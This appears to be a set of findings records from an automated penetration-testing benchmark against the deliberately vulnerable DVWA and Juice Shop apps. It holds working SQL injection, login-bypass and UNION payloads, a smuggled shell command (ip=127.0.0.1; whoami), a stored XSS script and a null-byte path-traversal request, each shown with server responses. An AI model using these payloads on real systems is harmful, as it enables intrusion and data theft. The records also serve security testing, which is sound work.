findings.title: DVWA SQL Injection (GET id parameter) [security=low]
findings.response_evidence: [security=low] TRUE payload 1' OR '1'='1 returned 5 records: surnames admin, Brown (Gordon), Me (Hack), Picasso (Pablo), Smith (Bob) with 'ID: 1' OR '1'='1 First name: ... Surname: ...'. FALSE payload 1' AND '1'='2 returned zero records (only 'User ID:' header with no ID/First name/Surname rows). SQLi DB: mysql.

findings.title: DVWA SQL Injection (POST id parameter, numeric) [security=medium]
findings.response_evidence: [security=medium] TRUE payload 1 OR 1=1 returned 5 records: 'ID: 1 OR 1=1 First name: admin Surname: admin', 'First name: Gordon Surname: Brown', 'First name: Hack Surname: Me', 'First name: Pablo Surname: Picasso', 'First name: Bob Surname: Smith'. FALSE payload 1 AND 1=2 returned zero records (only the dropdown option list '1 2 3 4 5' with no ID/First name/Surname rows). Page reports 'Security level set to medium' and 'Security Level: medium'.

findings.title: SQL Injection via session-input out-of-band id feeding high-level SQLi page [security=high]
request_sequence: [security=high] POST /security.php security=high seclev_submit=Submit user_token=[REDACTED] -> 302 (level set to high)
POST http://dvwa/vulnerabilities/sqli/session-input.php id=1' OR '1'='1' # Submit=Submit -> 200 'Session ID: 1' OR '1'='1' #'
findings.response_evidence: [security=high] TRUE payload (id=1' OR '1'='1' # stored via session-input, then /vulnerabilities/sqli/ loaded) returned 5 records with surnames: admin, Brown (Gordon), Me (Hack), Picasso (Pablo), Smith (Bob). FALSE payload (id=1' AND '1'='2' #) returned no records (only 'Click here to change your ID' and no 'First name:' rows). Page displays 'Security level set to high'. Difference TRUE vs FALSE confirms injectable session-stored id.

findings.title: OS Command Injection via ip parameter (DVWA Command Injection) [security=low]
request_sequence: POST http://dvwa/vulnerabilities/exec/ (session dvwa_admin, security=low) body: ip=127.0.0.1; whoami&Submit=Submit
findings.response_evidence: [security=low] HTTP 200. Ping output followed by injected command output on its own line: 'rtt min/avg/max/mdev = 0.018/0.023/0.034/0.006 ms' then 'www-data'. Page shows 'Security Level: low'. Identity www-data confirms command execution.

findings.title: Blind boolean SQL Injection via id parameter (DVWA SQLi Blind) [security=low]
findings.response_evidence: [security=low] TRUE condition (id=1' OR '1'='1): HTTP 200, 'User ID exists in the database.' FALSE condition (id=1' AND '1'='2): HTTP 404 (page body), 'User ID is MISSING from the database.' Differential boolean response confirms injection into the WHERE clause. Caveat: this blind page exposes only exists/missing, not surnames, so the surname-extraction criterion does not apply; the boolean differential is the observable proof. Note: before testing, the server's actual level was 'high' while session metadata said low; level was explicitly set to low via security.php before testing.

findings.title: Stored XSS in Guestbook message field [security=low]
request_sequence: GET http://dvwa/vulnerabilities/xss_s/ (dvwa_admin) -> 200, form fields txtName(maxlength 10), mtxMessage(maxlength 50), no CSRF token
POST http://dvwa/vulnerabilities/xss_s/ (dvwa_admin) form: txtName=xsstest, mtxMessage=<script id="test_token">window.xss_flag=1</script> (50 chars), btnSign=Sign Guestbook -> 200
findings.response_evidence: [security=low] Canary stored in guestbook (new entry 'Name: xsstest'). The text-summary rendering shows an empty message for the entry, consistent with the script tag being rendered as markup rather than text. On the rendering page loaded in a real browser (dvwa_admin session), window.xss_flag evaluated to 1. Note: the canary is 50 characters, which fits the 50-char maxlength (the 46-char estimate in the assignment was incorrect). Note: this entry persists in the DB and will show on all future page loads.

findings.title: DVWA security-level control endpoint (security.php): no in-scope vulnerability class applies
request_sequence: GET http://dvwa/security.php (dvwa_admin) observed: form security (low/medium/high/impossible), seclev_submit, user_token; current level low (from assignment observation)
findings.response_evidence: Not tested behaviorally. security.php only sets the DVWA security level; it is not a SQLi, OS command injection, stored XSS, or other class in the verification scope. Changing the level would also alter the benchmark state for the other DVWA checks, so I did not POST to it. Returning to the Coordinator: this endpoint needs a different CWE check (e.g. CSRF on the level-change form, CWE-352) if one is wanted, or it can be closed as out of scope.

findings.title: [security=medium] SQL Injection via POST id on /vulnerabilities/sqli/ (numeric boolean)
request_sequence: GET http://dvwa/vulnerabilities/sqli/ (dvwa_admin) -> form POST id, Submit; page shows 'Security Level: medium'
findings.response_evidence: [security=medium] TRUE payload id=1 OR 1=1 returned HTTP 200 with 5 records: 'ID: 1 OR 1=1 First name: admin Surname: admin'; 'First name: Gordon Surname: Brown'; 'First name: Hack Surname: Me'; 'First name: Pablo Surname: Picasso'; 'First name: Bob Surname: Smith'. FALSE payload id=1 AND 1=2 returned HTTP 200 with zero user records (only the page chrome, 'User ID: 1 2 3 4 5' help text, no 'First name'/'Surname' rows). Page footer confirms 'Security Level: medium'. Note: the session_info header field still reported 'low' but the page content confirmed medium. Behavioral differential TRUE vs FALSE confirms numeric SQL injection in POST id at medium.

findings.title: Cross-user basket access (BOLA) on GET /rest/basket/:id — acct2 reads acct1's basket
findings.response_evidence: acct1 (own basket 6) GET /rest/basket/6: HTTP 200 {"status":"success","data":{"id":6,"UserId":22,"Products":[{"id":1,"name":"Apple Juice (1000ml)","BasketItem":{"id":9,"quantity":3,...}}]}}. acct2 (own basket 7, acct2_bench@juiceshop.local) GET /rest/basket/6: HTTP 200 with the identical body: id 6, UserId 22, Products 'Apple Juice (1000ml)' quantity 3, BasketItem id 9. Account 2 retrieved Account 1's distinct seeded basket item (product name and quantity) without ownership check, confirming BOLA/IDOR.

findings.title: Login authentication bypass via SQL injection in email field (POST /rest/user/login)
findings.response_evidence: Control (wrong password for admin@juice-sh.op): HTTP 401, body 'Invalid email or password.' Payload (email=' OR 1=1--, arbitrary password): HTTP 200, application/json, body contains {\"authentication\":{\"token\":\"[REDACTED_JWT]\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}} i.e. a valid auth token issued for the first user admin@juice-sh.op. The injected comment-terminated predicate bypassed the password check.

findings.title: SQL injection in product search q parameter (GET /rest/products/search) - error-based and UNION
findings.response_evidence: Baseline q=apple: HTTP 200, JSON status success with real product rows (Apple Juice (1000ml), Apple Pomace). Error probe q=qwert': HTTP 500 with 'Error: SQLITE_ERROR: near \"'%'\": syntax error' (SQL error reflected). UNION probe q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9--: HTTP 200, body {\"status\":\"success\",\"data\":[{\"id\":1,\"name\":2,\"description\":3,\"price\":4,\"deluxePrice\":5,\"image\":6,\"createdAt\":7,\"updatedAt\":8,\"deletedAt\":9}]} - the injected literal integers are rendered in the product name/description/price fields, proving attacker-controlled UNION SELECT columns in the query result.

findings.title: Unauthenticated access to user feedback list with partially masked author emails
findings.response_evidence: HTTP 200 without authentication, JSON {"status":"success","data":[...8 records...]}. Records include UserId and comment, with no email field. Emails appear only inside comment text and are masked: "(***in@juice-sh.op)", "(***@juice-sh.op)", "(***der@juice-sh.op)", "(***ereum@juice-sh.op)". Other records are "(anonymous)" with UserId null. The endpoint is unauthenticated, but the emails are not fully disclosed, only masked fragments plus the domain. Confirming full email PII exposure would need a different source, so the verdict is inconclusive rather than confirmed.

findings.title: /rest/user/whoami does not disclose user data in response body
findings.response_evidence: Both the authenticated (acct1) and unauthenticated requests returned HTTP 200 with body {"user":{}}. The response body has no email, id, basket id, or token. The own_basket_id=6 value appears only in the harness session_info metadata, not in the server response. No sensitive information is exposed by the endpoint, so CWE-200 is not confirmed.

findings.title: Unauthenticated user-feedback listing exposes author identifiers (emails only partially masked)
findings.response_evidence: HTTP 200 application/json without authentication, 8 records with UserId, id, comment, rating, createdAt. Author emails appear only in masked form inside comment text, e.g. "(***in@juice-sh.op)", "(***@juice-sh.op)", "(***ereum@juice-sh.op)"; anonymous entries show "(anonymous)". The API response has no email field. The domain and fragments of the local part are visible, but full author email addresses are not disclosed, so the PII criterion is not met. Recommend a follow-up on whether unmasked emails are reachable (e.g., /api/Users unauthenticated), which is outside this assignment.

findings.title: Poison null-byte path traversal bypasses /ftp/ extension filter to read restricted package.json.bak
request_sequence: GET http://juiceshop:3000/ftp/package.json.bak (unauth) -> 403 'Error: Only .md and .pdf files are allowed!'
findings.response_evidence: Raw request to /ftp/package.json.bak returned HTTP 403 with body 'Error: Only .md and .pdf files are allowed!'. The null-byte variant /ftp/package.json.bak%2500.md returned HTTP 200 with the restricted backup file contents, beginning: '{ "name": "juice-shop", "version": "6.2.0-SNAPSHOT", "description": "An intentionally insecure JavaScript Web Application", ... "dependencies": { ... "sequelize": "~4", "sqlite3": "~3.1.13" ...'. The filter is bypassed by the URL-encoded null byte followed by the allowed .md extension.

findings.title: Browsable /ftp/quarantine directory listing exposed without authentication (contents are .url decoys, not key material)
request_sequence: GET http://juiceshop:3000/ftp/quarantine (unauth, Accept: text/html,application/json) -> 200 directory listing
findings.response_evidence: HTTP 200 'listing directory /ftp/quarantine' showing juicy_malware_linux_amd_64.url (166 bytes), juicy_malware_linux_arm_64.url (166), juicy_malware_macos_64.url (162), juicy_malware_windows_64.exe.url (168). The directory is browsable without authentication, but the files are .url link files named as malware samples; none are encryption keys (no premium.key or jwt.pub). Under the CWE-548 criterion (sensitive key files exposed), this is not confirmed. The directory-listing exposure itself is real and may warrant a separate low-severity finding. The key-directory criterion should be tested at /encryptionkeys/, which was not assigned here.

findings.title: /ftp/quarantine browsable listing does not expose key material (CWE-548 criterion not met)
findings.response_evidence: Unauthenticated GET /ftp/quarantine returned HTTP 200 with a directory listing ('listing directory /ftp/quarantine ... juicy_malware_linux_amd_64.url 166, juicy_malware_linux_arm_64.url 166, juicy_malware_macos_64.url 162, juicy_malware_windows_64.exe.url 168'). The listing is browsable, but the entries are small .url shortcut files named as malware samples; no key, credential, or sensitive configuration files are exposed. The CWE-548 criterion (sensitive key files such as premium.key / jwt.pub) is not met. Not confirmed as CWE-548; the open listing is a low-severity informational exposure at most. Only the listing was fetched; the .url contents were not retrieved.
